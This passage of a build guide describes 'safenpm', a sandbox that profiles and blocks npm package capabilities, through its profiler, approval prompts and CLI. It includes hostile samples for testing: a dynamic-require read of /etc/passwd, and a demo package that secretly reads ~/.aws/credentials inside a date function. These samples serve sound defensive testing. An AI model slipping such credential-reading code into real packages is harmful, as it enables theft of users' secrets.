                           packageJson.scripts?.install ||
                           packageJson.scripts?.preinstall;

  if (!hasInstallScript) {
    return { filesRead: [], filesWritten: [], networkHosts: [], envVarsRead: [], processesSpawned: [] };
  }

  // create a fake home directory so the script can't read real credentials
  const fakeHome = fs.mkdtempSync(path.join(os.tmpdir(), 'safenpm-profile-'));

  const spyScript = path.join(__dirname, 'spy-bootstrap.js');
  const outputFile = path.join(os.tmpdir(), `safenpm-obs-${Date.now()}.json`);

  try {
    execSync('npm run postinstall', {
      cwd: packageDir,
      env: {
        PATH: process.env.PATH,
        HOME: fakeHome,                    // fake home — no real credentials
        SAFENPM_OUTPUT: outputFile,        // spy writes observations here
        NODE_OPTIONS: `--require ${spyScript}`,
      },
      timeout: 30_000,                     // 30 second timeout
      stdio: ['ignore', 'pipe', 'pipe'],
    });
  } catch {
    // install script failed or timed out — that's fine, we still read observations
  }

  try {
    return JSON.parse(fs.readFileSync(outputFile, 'utf8'));
  } catch {
    return { filesRead: [], filesWritten: [], networkHosts: [], envVarsRead: [], processesSpawned: [] };
  } finally {
    fs.rmSync(fakeHome, { recursive: true, force: true });
    fs.rmSync(outputFile, { force: true });
  }
}
```

**File: `src/profiler/spy-bootstrap.js`** (vanilla JS — injected into the profiled process)

```javascript
// this file is --required into the package being profiled
// it intercepts all I/O and writes observations to SAFENPM_OUTPUT

const Module = require('module');
const originalLoad = Module._load;
const obs = { filesRead: [], filesWritten: [], networkHosts: [], envVarsRead: [], processesSpawned: [] };

Module._load = function(request, parent, isMain) {
  const mod = originalLoad.apply(this, arguments);

  if (request === 'fs') return spyFs(mod);
  if (request === 'net' || request === 'http' || request === 'https') return spyNet(mod, obs);
  if (request === 'child_process') return spyCp(mod, obs);

  return mod;
};

// spy on process.env reads
const realEnv = process.env;
process.env = new Proxy(realEnv, {
  get(t, prop) { obs.envVarsRead.push(prop); return t[prop]; }
});

// write observations on exit
process.on('exit', () => {
  const fs = require('fs');
  try { fs.writeFileSync(process.env.SAFENPM_OUTPUT, JSON.stringify(obs)); } catch {}
});

function spyFs(realFs) { /* same proxy pattern, pushes paths to obs.filesRead/Written */ }
function spyNet(realNet) { /* pushes hosts to obs.networkHosts */ }
function spyCp(realCp) { /* pushes commands to obs.processesSpawned */ }
```

---

### Step 3.5 — Profile Builder

Convert raw observations into a clean `PackageCapability` object.

**File: `src/profiler/index.ts`**

```typescript
export async function buildProfile(
  pkg: ResolvedPackage,
  observations: ObservedBehavior,
  nativeReport: NativeModuleReport
): Promise<PackageCapability> {
  return {
    version: pkg.version,
    fs: {
      read:  dedupeAndMinimize(observations.filesRead),
      write: dedupeAndMinimize(observations.filesWritten),
    },
    net: {
      outbound: observations.networkHosts.length > 0,
      hosts: [...new Set(observations.networkHosts)],
    },
    env: [...new Set(observations.envVarsRead.filter(v => !isSecretEnvVar(v)))],
    child_process: {
      allowed: observations.processesSpawned.length > 0,
      allowedCommands: [...new Set(observations.processesSpawned)],
    },
    worker_threads: false,
    hasNativeModules: nativeReport.hasNative,
    approvedBy: 'auto',
    approvedAt: new Date().toISOString(),
  };
}

function dedupeAndMinimize(paths: string[]): string[] {
  // if /tmp/a and /tmp/b were observed, minimize to /tmp/**
  // reduces noise in the profile
  const sorted = [...new Set(paths)].sort();
  const minimized: string[] = [];

  for (const p of sorted) {
    const parent = minimized.find(m => p.startsWith(m.replace('/**', '')));
    if (!parent) minimized.push(p);
  }

  return minimized;
}
```

---

## Phase 4 — The CLI and Approval Flow
### Goal: `safenpm install express` works end to end

---

### Step 4.1 — Approval UI

**File: `src/ui/approval-prompt.ts`**

Uses Node's readline for terminal interaction. No external dependencies.

```typescript
import readline from 'readline';
import type { PackageCapability } from '../capabilities/schema';

export interface ApprovalResult {
  approved: boolean;
  userNote?: string;
}

export async function promptForApproval(
  packageName: string,
  profile: PackageCapability,
  isNew: boolean
): Promise<ApprovalResult> {

  printCapabilitySummary(packageName, profile, isNew);

  const risks = assessRisks(profile);
  if (risks.length === 0) {
    // no risks — auto-approve, just show summary
    return { approved: true };
  }

  // there are risks — require explicit approval
  return await askUser(packageName, risks);
}

function printCapabilitySummary(name: string, p: PackageCapability, isNew: boolean): void {
  const tag = isNew ? '(not in registry — locally profiled)' : `(${p.registryObservations ?? 0} observations)`;

  console.log(`\n  ${name}@${p.version} ${tag}`);
  console.log(`    filesystem  read : ${p.fs.read.length  ? p.fs.read.join(', ')  : 'none'}`);
  console.log(`    filesystem  write: ${p.fs.write.length ? p.fs.write.join(', ') : 'none'}`);
  console.log(`    network outbound : ${p.net.outbound ? (p.net.hosts.join(', ') || 'any host') : 'none'}`);
  console.log(`    env vars         : ${p.env.length ? p.env.join(', ') : 'none'}`);
  console.log(`    spawn processes  : ${p.child_process.allowed ? 'yes' : 'no'}`);
  if (p.hasNativeModules) {
    console.log(`    ⚠  native modules: YES — JS enforcement is partial`);
  }
}

function assessRisks(p: PackageCapability): string[] {
  const risks: string[] = [];

  if (p.fs.read.some(path => path.includes(os.homedir()))) {
    risks.push('reads your home directory (may access credentials)');
  }
  if (p.net.outbound && !p.net.hosts.length) {
    risks.push('makes outbound network calls to any host');
  }
  if (p.child_process.allowed) {
    risks.push('spawns child processes');
  }
  if (p.hasNativeModules) {
    risks.push('contains native code (cannot be fully sandboxed at JS level)');
  }

  return risks;
}

async function askUser(packageName: string, risks: string[]): Promise<ApprovalResult> {
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

  console.log(`\n  ⚠  ${packageName} has ${risks.length} risk(s):`);
  risks.forEach(r => console.log(`     • ${r}`));

  return new Promise(resolve => {
    rl.question('\n  Proceed? [y]es / [n]o / [d]etails  → ', answer => {
      rl.close();
      resolve({ approved: answer.trim().toLowerCase() === 'y' });
    });
  });
}
```

---

### Step 4.2 — capabilities/writer.ts

```typescript
import fs from 'fs';
import path from 'path';
import type { CapabilitiesFile } from './schema';

export function writeCapabilities(capabilities: CapabilitiesFile, projectRoot: string): void {
  const outputPath = path.join(projectRoot, 'package-capabilities.json');
  fs.writeFileSync(outputPath, JSON.stringify(capabilities, null, 2) + '\n');
  console.log(`\n  ✓ package-capabilities.json written (${Object.keys(capabilities.packages).length} packages)`);
}
```

---

### Step 4.3 — Install Command (Full Flow)

**File: `src/cli/install.ts`**

```typescript
import { resolvePackageTree } from '../profiler/resolver';
import { fetchProfile } from '../profiler/registry-client';
import { profileInstallScript } from '../profiler/install-script-runner';
import { detectNativeModules } from '../profiler/native-detector';
import { buildProfile } from '../profiler/index';
import { promptForApproval } from '../ui/approval-prompt';
import { writeCapabilities } from '../capabilities/writer';
import { execSync } from 'child_process';

export async function runInstall(packages: string[]): Promise<void> {
  console.log(`\nResolving dependency tree for: ${packages.join(', ')}...`);

  const resolved = resolvePackageTree(packages);
  console.log(`Found ${resolved.length} packages total.\n`);

  const capabilities: CapabilitiesFile = {
    version: '1.0',
    generatedAt: new Date().toISOString(),
    projectRoot: process.cwd(),
    packages: {}
  };

  const needsApproval: Array<{ pkg: typeof resolved[0], profile: PackageCapability, isNew: boolean }> = [];

  // Phase 1: gather all profiles (fast — mostly registry lookups)
  const spinner = startSpinner('Fetching profiles from registry...');

  for (const pkg of resolved) {
    let profile = await fetchProfile(pkg.name, pkg.version);
    let isNew = false;

    if (!profile) {
      // not in registry — profile locally
      spinner.update(`Profiling ${pkg.name}@${pkg.version} locally...`);
      const tempDir = await downloadPackage(pkg);
      const nativeReport = detectNativeModules(tempDir);
      const observations = profileInstallScript(tempDir, getPackageJson(tempDir));
      profile = await buildProfile(pkg, observations, nativeReport);
      isNew = true;
      cleanup(tempDir);
    }

    capabilities.packages[pkg.name] = profile;

    const risks = assessRisks(profile);
    if (risks.length > 0 || isNew) {
      needsApproval.push({ pkg, profile, isNew });
    }
  }

  spinner.stop();

  // Phase 2: show summary + get approvals for risky packages
  console.log(`\nCapability summary (${resolved.length} packages):\n`);

  // show clean packages inline
  const cleanCount = resolved.length - needsApproval.length;
  if (cleanCount > 0) {
    console.log(`  ✓  ${cleanCount} packages — no capabilities required`);
  }

  // show risky ones and ask
  for (const { pkg, profile, isNew } of needsApproval) {
    const result = await promptForApproval(pkg.name, profile, isNew);

    if (!result.approved) {
      console.log(`\nInstall cancelled. ${pkg.name} was not approved.`);
      process.exit(1);
    }

    capabilities.packages[pkg.name] = {
      ...profile,
      approvedBy: 'user',
      approvedAt: new Date().toISOString(),
      userNote: result.userNote,
    };
  }

  // Phase 3: run the actual npm install
  console.log('\nAll packages approved. Running npm install...\n');
  execSync(`npm install ${packages.join(' ')}`, { stdio: 'inherit' });

  // Phase 4: write the capabilities file
  writeCapabilities(capabilities, process.cwd());

  console.log('\nRun your app with enforcement active:');
  console.log(`  node --require safenpm/enforcer your-app.js\n`);
}
```

---

### Step 4.4 — CLI Entry Point

**File: `src/cli/index.ts`**

```typescript
#!/usr/bin/env node
import { runInstall } from './install';

const [,, command, ...args] = process.argv;

switch (command) {
  case 'install':
  case 'i':
    runInstall(args).catch(err => {
      console.error(err.message);
      process.exit(1);
    });
    break;

  case 'audit':
    // Phase 5 — scan existing node_modules against current profiles
    console.log('audit: coming soon');
    break;

  default:
    console.log(`
safenpm — behavioral sandbox for npm packages

Usage:
  safenpm install <packages>   install with capability profiling
  safenpm audit                audit installed packages against profiles

Run your app with enforcement:
  node --require safenpm/enforcer src/app.js
    `);
}
```

---

## Phase 5 — Hardening and Edge Cases
### Goal: close the gaps that real-world packages expose

---

### Step 5.1 — Handle Dynamic require()

Some packages use `require(variable)` where the module name is computed at runtime.
Your interceptor already handles this because it intercepts ALL `Module._load` calls
regardless of how they were triggered — static or dynamic.

But add a test:
```typescript
// dynamic require — should still be intercepted
const moduleName = 'f' + 's';
require(moduleName).readFileSync('/etc/passwd'); // must still be blocked
```

---

### Step 5.2 — Handle ESM (import statements)

ES modules use a different loader. For Node 18+, hook into the ESM loader hooks:

**File: `src/enforcer/esm-loader.mjs`**

```javascript
// Node ESM loader hooks
export async function load(url, context, nextLoad) {
  // intercept built-in module loads in ESM context
  // apply same capability checks
  return nextLoad(url, context);
}
```

Run with:
```bash
node --require safenpm/dist/enforcer/index.js \
     --loader safenpm/dist/enforcer/esm-loader.mjs \
     src/app.mjs
```

---

### Step 5.3 — Scoped Package Name Handling

`@aws-sdk/client-s3` needs special handling in `extractPackageName`.
The current regex handles it but write explicit tests:

```
extractPackageName('/node_modules/@aws-sdk/client-s3/dist/index.js') → '@aws-sdk/client-s3'
extractPackageName('/node_modules/@types/node/index.d.ts')           → '@types/node'
```

---

### Step 5.4 — Monorepo Support

In monorepos, packages can live at:
- `./node_modules/lodash`
- `./packages/my-app/node_modules/lodash`

Update `extractPackageName` to handle nested `node_modules`:
```typescript
// match the LAST node_modules occurrence for nested installs
const matches = [...normalized.matchAll(/node_modules\/((?:@[^/]+\/)?[^/]+)\//g)];
if (matches.length > 0) return matches[matches.length - 1][1];
```

---

### Step 5.5 — Capabilities Diff on Update

When a package version bumps, show what changed in its profile.

**File: `src/ui/diff-display.ts`**

```typescript
export function diffProfiles(
  packageName: string,
  oldProfile: PackageCapability,
  newProfile: PackageCapability
): void {
  const changes: string[] = [];

  // check for new network hosts
  const newHosts = newProfile.net.hosts.filter(h => !oldProfile.net.hosts.includes(h));
  if (newHosts.length) changes.push(`+ network access to: ${newHosts.join(', ')}`);

  // check for new fs paths
  const newReads = newProfile.fs.read.filter(p => !oldProfile.fs.read.includes(p));
  if (newReads.length) changes.push(`+ filesystem read: ${newReads.join(', ')}`);

  // check if child_process was added
  if (!oldProfile.child_process.allowed && newProfile.child_process.allowed) {
    changes.push('+ can now spawn child processes');
  }

  if (changes.length > 0) {
    console.log(`\n  ⚠  ${packageName} capability changes in new version:`);
    changes.forEach(c => console.log(`     ${c}`));
  }
}
```

---

## Build Order Summary

```
Phase 1 — Core Infrastructure
  1.1  Project bootstrap (npm init, TypeScript, Vitest)
  1.2  Capability schema (types only)
  1.3  Path utilities + secret detector + exfil detector (with tests)
  1.4  Stack parser + caller resolver (with tests)
  1.5  Violation logger

Phase 2 — The Enforcer
  2.1  Module interceptor (Module._load patch)
  2.2  fs shim
  2.3  env proxy
  2.4  net + http + https shims
  2.5  dns shim
  2.6  child_process shim
  2.7  Enforcer entry point (index.ts)
  2.8  Test fixtures + integration tests
       ← MILESTONE: node --require safenpm/enforcer blocks all 5 attack routes

Phase 3 — The Profiler
  3.1  Dependency resolver (npm --package-lock-only)
  3.2  Registry client (HTTP fetch with fallback)
  3.3  Native module detector
  3.4  Install script runner + spy-bootstrap.js
  3.5  Profile builder (observations → PackageCapability)

Phase 4 — The CLI
  4.1  Approval UI (terminal prompts)
  4.2  Capabilities writer
  4.3  Install command (full flow)
  4.4  CLI entry point
       ← MILESTONE: safenpm install express works end to end

Phase 5 — Hardening
  5.1  Dynamic require() test
  5.2  ESM loader hooks
  5.3  Scoped package edge cases
  5.4  Monorepo support
  5.5  Capabilities diff on package updates
       ← MILESTONE: production-ready, handles real-world packages
```

---

## What You Can Demo After Phase 2

```bash
# create a fake malicious package
mkdir -p /tmp/test-malicious/node_modules/evil-date-lib
cat > /tmp/test-malicious/node_modules/evil-date-lib/index.js << 'EOF'
const fs = require('fs');
module.exports = {
  formatDate: (d) => {
    // evil code hidden inside innocent utility
    fs.readFileSync(process.env.HOME + '/.aws/credentials');
    return d.toISOString();
  }
};
EOF

# write a capabilities file that gives evil-date-lib no permissions
cat > /tmp/test-malicious/package-capabilities.json << 'EOF'
{
  "version": "1.0",
  "packages": {
    "evil-date-lib": {
      "version": "1.0.0",
      "fs": { "read": [], "write": [] },
      "net": { "outbound": false, "hosts": [] },
      "env": [],
      "child_process": { "allowed": false }
    }
  }
}
EOF

# run it with the enforcer
cd /tmp/test-malicious
node --require safenpm/dist/enforcer/index.js -e "require('evil-date-lib').formatDate(new Date())"

# output:
# [SAFENPM CRITICAL] BLOCKED
#   Package  : evil-date-lib
#   Attempted: fs.readFileSync('/home/user/.aws/credentials')
#   Reason   : CREDENTIAL_THEFT_ATTEMPT
```

That is the demo. That is what you show people.
